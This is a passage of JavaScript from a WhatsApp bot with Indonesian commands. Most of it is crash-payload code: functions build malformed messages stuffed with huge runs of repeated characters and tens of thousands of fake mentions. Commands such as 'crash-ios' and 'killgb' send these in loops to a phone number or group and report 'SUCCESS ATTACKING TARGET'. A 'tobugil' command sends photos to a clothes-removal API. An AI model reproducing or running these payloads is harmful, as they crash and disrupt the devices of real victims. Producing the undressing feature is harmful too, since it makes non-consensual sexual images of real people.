                    totalCurrencyCode: "IDR",
                    messageVersion: 1,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await Ikyy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function Xcatalog(target) {
    Ikyy.relayMessage(target, {
        viewOnceMessage: {
            message: {
                orderMessage: {
                    orderId: "82737288282",
                    thumbnail: null,
                    itemCount: 99999999999,
                    status: "INQUIRY",
                    surface: "CATALOG",
                    message: "\u0000".repeat(999),
                    orderTitle: "\u0000",
                    sellerJid: m.chat,
                    token: "8282882828==",
                    totalAmount1000: "Lezz DcodeR",
                    totalCurrencyCode: "IDR",
                    messageVersion: 1,
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    }, {
        messageId: Date(),
        participant: {
            jid: target
        }
    })
}
*/

async function InVisibleIOS(Ikyy, target, show = true) {
        const msg = {
                message: {
                        locationMessage: {
                                degreesLatitude: 21.1266,
                                degreesLongitude: -11.8199,
                                name: "ᎲᎲᎲᎲᎲᎲ" 
                                + "𑇂𑆵𑆴𑆿".repeat(60000),
                                url: "https://t.me/depaygantengbjirr",
                                contextInfo: {
                                        externalAdReply: {
                                                quotedAd: {
                                                        advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                                                        mediaType: "IMAGE",
                                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                                        caption: "ᎲᎲᎲᎲᎲᎲ." 
                                                        + "𑇂𑆵𑆴𑆿".repeat(60000)
                                                },
                                                placeholderKey: {
                                                        remoteJid: "0s.whatsapp.net",
                                                        fromMe: false,
                                                        id: "ABCDEF1234567890"
                                                }
                                        }
                                }
                        }
                }
        };
  
        await Ikyy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key?.id || "",
                statusJidList: [target],
                additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target } }]
                        }]
                }]
        });

        if (show) {
                await Ikyy.relayMessage(target, {
                        groupStatusMentionMessage: {
                                message: {
                                        protocolMessage: { key: msg.key, type: 25 }
                                }
                        }
                }, {
                        additionalNodes: [{
                                tag: "meta",
                                attrs: { is_status_mention: "ᎲᎲ" }
                        }]
                });
        }

        console.log(`Succes Send Bug `);
        await new Promise(resolve => setTimeout(resolve, 9000));
}     

async function BugGb1(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Ꮙ17ᎲᎲᎲ" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await Ikyy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}

async function BugGb12(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Ꮙ17ᎲᎲᎲ" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire Official",
                    },
                ],
            },
        };

        await Ikyy.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}    

case 'invis-ios': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreplybug(`*NIKA VERSION 18*
> SUCCESS ATTACKING TARGET
Type : ${command}
Target : ${target}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await InVisibleIOS(Ikyy, target, true);
await InVisibleIOS(Ikyy, target, true);
await InVisibleIOS(Ikyy, target, true);
}
}
break 

case 'crash-ios':
case 'blank-ios': {
if (!isCreator && !isPremium && !isUnli) return payreply(`Khusus Owner`)
if (!q) return payreply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
payreplybug(`*NIKA VERSION 18*
> SUCCESS ATTACKING TARGET
Type : ${command}
Target : ${target}
Status : Success Full Attack ✅
> Harap jeda 5-10 menit agar whatsapp anda tidak kenon`)
for (let i = 0; i < 100; i++) {
await BakIyos(Ikyy, target);
await BakIyos(Ikyy, target);
await BakIyos(Ikyy, target);
}
}
break 

case 'blankgb':
case 'killgb':
case 'buggb': {
   if (!m.isGroup) return payreply('Khusus Bug Grup!!!')
   if (!isCreator) return payreply(`*Can only be used in bot numbers*`)   
    payreply(`*Ok*`)
    {    
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);
    await BugGb1(m.chat);
    await BugGb12(m.chat);    
        }
    }
                break      
/*               
case 'tagsw':
case 'delay-invis':
case 'super-delay':                
case 'invisible-v1': {
    // Tambahkan pengecekan akses
    if (!isCreator && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Ikyy.sendMessage(m.chat, { 
        video: { url: `https://files.catbox.moe/qpq6b0.mp4` },
        caption: `*𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 - NIKA V17*
> Berhasil Mengirim Bug Ke Target *${pepec}*        
        `,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 200; i++) {
     await DelayinvisNew(target)
     await DelayinvisNew(target)
   }
}
break                

case 'xcrash-ui':  
case 'system-ui': {
    // Tambahkan pengecekan akses
    if (!isCreato && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Ikyy.sendMessage(m.chat, { 
        video: { url: `https://files.catbox.moe/qpq6b0.mp4` },
        caption: `*𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 - NIKA V17*
> Berhasil Mengirim Bug Ke Target *${pepec}*        
        `,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 100; i++) {
     await BlankBug(target)
     await BlankBug(target)
   }
}
break          

case 'blank-delay': {
    // Tambahkan pengecekan akses
    if (!isCreator && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Ikyy.sendMessage(m.chat, { 
        video: { url: `https://files.catbox.moe/qpq6b0.mp4` },
        caption: `*𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 - NIKA V17*
> Berhasil Mengirim Bug Ke Target *${pepec}*        
        `,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 300; i++) {
     await BlankBug(target)
     await DelayVisible1(Ikyy, target)
     await UiBlank(Ikyy, target) 
  // await AudioParams(Ikyy, target) 
   }
}
break          

case 'apple-crash':
case 'invis-ios':  
case 'crash-ios': {
    // Tambahkan pengecekan akses
    if (!isCreator && !isPremium) return payreply(`Fitur Bug Khusus Owner`)        
    if (!q) 
       payreply(`Penggunaan ${prefix + command} 628xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    Ikyy.sendMessage(m.chat, { 
        video: { url: `https://files.catbox.moe/qpq6b0.mp4` },
        caption: `*𝐕𝐀𝐍𝐓𝐀𝐒𝐈𝐂 - NIKA V17*
> Berhasil Mengirim Bug Ke Target *${pepec}*        
        `,
        gifPlayback: true,
    }, { quoted: m });
    // Kirim bug ke target
    for (let i = 0; i < 200; i++) {
     await InVisibleIOS(Ikyy, target, true);
     await InVisibleIOS(Ikyy, target, true);
     await InVisibleIOS(Ikyy, target, true);
   }
}
break      

case 'tesss': {
   if (!m.isGroup) return payreply('Khusus Grup!!!')
   if (!isCreator) return payreply(`*Can only be used in bot numbers*`)   
//    payreply(`*Ok*`)
    {    
    await xgroupnulL(m.chat);
    await DelayGroup(m.chat);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await DelayGroup(m.chat);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await DelayGroup(m.chat);
    await DelayGroup(m.chat);
    await xgroupnulL(m.chat);
    await BugGb1(m.chat);
    await DelayGroup(m.chat);            
        }
    }
                break      
                
*/         
case "tobugil": {
    try {
      if (!isCreator) return payreply(`cuih, sangean ga modal, owner doang yg bsa make ni anjg`)
        const q = m.quoted ? m.quoted : m;
        const mime = (q.msg || q).mimetype || "";

        if (!mime.includes("image"))
            return payreply("_Kirim atau reply foto yang mau diubah!_");

        const buffer = await q.download();

        let uploadImage = require('./database/uploadImage');
        const uploadedUrl = await uploadImage(buffer);

        payreply("prosess wok...");

        const api = await fetch(
            `https://api.nekolabs.web.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(uploadedUrl)}`
        );
        const res = await api.json();

        if (!res.success || !res.result)
            return payreply("_Gagal memproses foto!_");

        await Ikyy.sendMessage(
            m.chat,
            {
                image: { url: res.result },
                caption: "*Done Bang*"
            },
            { quoted: m }
        );

    } catch (e) {
        payreply("_Terjadi kesalahan saat memproses foto!_");
    }
}
break;

case "instagram": case "igdl": case "ig": case "igvideo": case "igimage": case "igvid": case "igimg": {
	  if (!q) return payreply(`❌ Format salah\nGunakan : ${prefix+command} link nya`)
	  payreply("process video download from instagram . . .")
	  Ikyy.sendMessage(m.chat, { react: { text: `✈️`, key: m.key }})
 try {
    const data = await fetchJson(`https://api.neoxr.eu/api/ig?url=${q}&apikey=zakkigans12`);
if (data && data.data && data.data.length > 0 && data.data[0].url) {
    const hasil = data.data[0].url;
    const cap = `ini dia kak🔥`;
    Ikyy.sendMessage(m.chat, { video: { url: hasil }, caption: cap }, { quoted: m });
}
} catch (error) {
    console.error(error);
    const cap = `Maaf, videonya nggak bisa diambil. ini gambar yang tersedia:`;
    Ikyy.sendMessage(m.chat, { image: {url: hasil }, caption: cap}, {quoted: m});
}
}
break

case 'coding': {
  if (!q) return ReplyAi(`Alo, mau nanya apa?`)
async function openai(text, logic) { 
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  
            "tokenLimit": 8000,  
            "completionTokenLimit": 5000,  
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": q, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let astaga = await openai(q, "nama mu adalah nika, kamu seorang programmer profesional, kamu akan membantu user membuat codingan, kamu hanya mengirim kan code, hanya code, jangan pakai keterangan")
Ikyybut(astaga)
}
break;

case 'qc': {
  if (!q) return payreply(`Send command with text. ${prefix + command} Hai`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await Ikyy.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Ikyy.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

case "playmp4": {
    if (!q) return payreply(`\n*ex:* ${prefix + command} impossible\n`);
    payreply(`Loading video...`);
    
    let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${q}`);
    let ahh = mbut.result;
    let videoUrl2 = ahh.download.video;

    Ikyy.sendMessage(m.chat, {
        video: { url: videoUrl2 },
        caption: `🎵 *${ahh.title}*\n`,
        mimetype: 'video/mp4'
    }, { quoted: m });
}
break;
       
async function DelayGroup(target) {
    const mentionedList = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);

  await Ikyy.sendMessage(target, {
    text: "tess",
    mentions: target,
    contextInfo: {
      mentionedJid: mentionedList,
      isGroupMention: true
    }
  });
}

async function xgroupnulL(target) {
         await Ikyy.relayMessage(
                  target,
                  {
                           viewOnceMessage: {
                                    message: {
                                             interactiveResponseMessage: {
                                                      body: {
                                                               text: "tess",
                                                               format: "DEFAULT"
                                                      },
                                                      nativeFlowResponseMessage: {
                                                               name: "call_permission_request",
                                                               paramsJson: "\u0000".repeat(1000000),
                                                               version: 3
                                                      }
                                             },
                                             contextInfo: {
                                                      mentionedJid: [
                                                               ...Array.from(
                                                                        { length: 1950 },
                                                                        () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
                                                               )
                                                      ]
                                             }
                                    }
                           }
                  },
                  {}
         );
}  

async function VisibleX(isTarget) {
  const msg = await generateWAMessageFromContent(isTarget, {
    buttonsMessage: {
      text: "Ω",
      contentText: "RaffxIsHere",
      footerText: "RaffxIsHere",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " RaffxIsHere " + "\u0000".repeat(500000)
          },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {})

  await Ikyy.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
    participant: { jid: isTarget }
  })
}
  
  
// Invisible
async function InVisibleX(isTarget, show = true) {
  let msg = await generateWAMessageFromContent(isTarget, {
    buttonsMessage: {
      text: "Ω",
      contentText: "RaffxIsHere",
      footerText: "RaffxIsHere",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " RaffxIsHere " + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await Ikyy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (show) {
    await Ikyy.relayMessage(
      isTarget,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "By Raffx👾",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

// Visible
async function CVisible(isTarget) {
  await Ikyy.relayMessage(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "RaffxIsHere",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: isTarget },
    }
  );
}

// Invisible
async function CInVisible(isTarget, show = true) {
  const msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Kont",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await Ikyy.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await Ikyy.relayMessage(
      isTarget,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "Yy",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}
async function docthumb(Ikyy, target) {
  const pnx = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "⎋" + "\u0000".repeat(7500) + "꧀".repeat(55000),
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
              mimetype: "raldz/pler/application/vnd.openxmlformats-officedocument.presentationml.presentation/video/mp4/image/jpeg/webp/audio/mpeg",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1073741824000000",
              pageCount: 9007199254740991 * 9999,
              mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
              fileName: "‣" + "꧀".repeat(1000),
              fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
              directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1723855952",
              contactVcard: true,
              thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
              thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
              thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
            },
            hasMediaAttachment: true
          },
          body: {
            text: "꧀".repeat(60000)
          },
          contextInfo: {
            remoteJid: "X",
            participant: target,
            mentionedJid: [
              target,
              "0@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from(
              { length: 1990 },
              () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
              ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: -99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999e999999999999999999999999999999999999999999999999999999999999999 * 999999999999999999999999999999999999999999999999999999999e99999999999
              }
            },
          },
          nativeFlowMessage: {
            messageParamsJson: "{]".repeat(10000),
            messageVersion: 3,
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\0" + "‣" + "꧀".repeat(9999),
                  "flow_message_version": "3"
                })
              },
            ]
          }
        }
      }
    },
    participant: { jid: target }
  };

  const pnxMessage = generateWAMessageFromContent(
    target,
    proto.Message.fromObject(pnx),
    {
      userJid: target
    }
  );
  await Ikyy.relayMessage(
    target,
    pnxMessage.message,
    {
      messageId: pnxMessage.key.id
    }
  );
}

async function LocaXotion(target) {
    await Ikyy.relayMessage(
        target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 197-7728-82882,
                        degreesLongitude: -111-188839938,
                        caption: ' GROUP_MENTION ' + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                        sequenceNumber: '0',
                        jpegThumbnail: '',
                        contextInfo: {
                            forwardingScore: 177,
                            isForwarded: true,
                            quotedMessage: {
                                documentMessage: {
                                    contactVcard: true
                                }
                            },
                            groupMentions: [{
                                groupJid: "1999@newsletter",
                                groupSubject: " Subject "
                            }]
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        }
    );
}

async function epInvite(Ikyy, target) {
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            groupInviteMessageV4Ptc: {
              groupJid: "13135550002@g.us",
              groupName: "᬴".repeat(25000),
              caption: "ꦾ".repeat(25000),
              inviteCode: Date.now(),
              inviteExpiration: Date.now() * 999e+21,
              groupType: "COMMUNITY_SUBGROUP",
              jpegThumbnail: "X",
              inviterJid: "13135550002@s.whatsapp.net",
              inviterName: "Meta AI",
              linkType: 3,
              threadMetaData: {
                threadJid: "13135550002@community",
                parentGroupJid: "13135550002@g.us",
                parentName: "Meta AI"
              },
              inviteSource: 1,
              contextInfo: {
                remoteJid: "X",
                isForwarded: true,
                forwardingScore: 9999,
                mentionedJid: [
                  target,
                  "13135550002@s.whatsapp.net",
                  ...Array.from(
                    { length: 1998 },
                    () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                  )
                ],
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: 999e+21 * 999e+21
                  }
                },
              }
            }
          }
        }
      }
    }
  }), { userJid: target });
  await Ikyy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: m.sender }
  });
}

async function inglx(target, zid = true) {
  for(let y = 0; y < 50; y++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "\u0000".repeat(200),
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message", 
          paramsJson: `{\"flow_cta\":\"િ፷#𖣂-4᷋dit⃔chieᷓci᷋st፮▾‌⟆🎭${"\u0000".repeat(1000000)}\",\"flow_message_version\":\"3\"}`,
          version: 3
        }
      }
    }, {});
  
    await Ikyy.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}

async function BakIyos(sock, target, pc = true) {
  for(let z = 0; z < 666; z++) {
    await sleep(1000);
    let msg = generateWAMessageFromContent(
      target,
      {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() * 999e+21
        }
      },
      {}
    );

    await Ikyy.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      pc
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}

// V1
async function ChV1(Ikyy, target) {
  await Ikyy.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {})
}

// V2
async function ChV2(Ikyy, target) {
  await Ikyy.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net", 
            remoteJid: "status@broadcast", 
            id: generateMessageTag() // bisa ganti "\0" atau null aja
          }, 
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {})
}

async function glxFrcVisible(Ikyy, target) {
  try {
    const msg = await generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {},
          body: {
            text: "D?",
            format: "EXTENSION_1" // "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
            version: 3
          }
        }
      },
      {}
    );
    await Ikyy.relayMessage(target, msg.message, { messageId: msg.key.id });
  } catch (e) {
    console.error("error:", e);
  }
}

async function glxFrcInvisible(Ikyy, target) {
  try {
    for (let i = 0; i < 100; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "D?",
              format: "EXTENSION_1"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
              version: 3
            }
          }
        },
